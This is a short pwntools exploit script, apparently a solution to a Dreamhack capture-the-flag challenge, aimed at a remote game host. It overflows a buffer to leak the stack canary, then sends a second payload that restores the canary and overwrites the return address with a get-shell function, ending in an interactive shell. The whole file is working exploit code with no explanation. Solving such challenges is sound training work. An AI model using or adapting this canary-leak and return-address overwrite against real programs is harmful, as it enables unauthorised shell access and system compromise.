from pwn import *

p = remote('host3.dreamhack.games', 15945)

get_shell_addr = 0x400a4a

p.recvuntil(b'> ')
p.sendline(str(1).encode())
p.recvuntil(b'> ')
p.sendline(str(2).encode())

p.recvuntil(b'Size: ')
p.sendline(str(0x8e9).encode())
p.recvuntil(b'Data: ')
payload = b'A' * 0x8e8 + b'b'
p.sendline(payload)
#p.interactive()

p.recvuntil(b'Ab')
canary = u64(b'\x00' + p.recvn(7))
print('canary : ' + str(hex(canary)))

p.sendline(str(3).encode())
p.recvuntil(b'Leave comment: ')
payload = b'a' * 0x28
payload += p64(canary)
payload += b'a'*8
payload += p64(get_shell_addr)

p.sendline(payload)

p.interactive()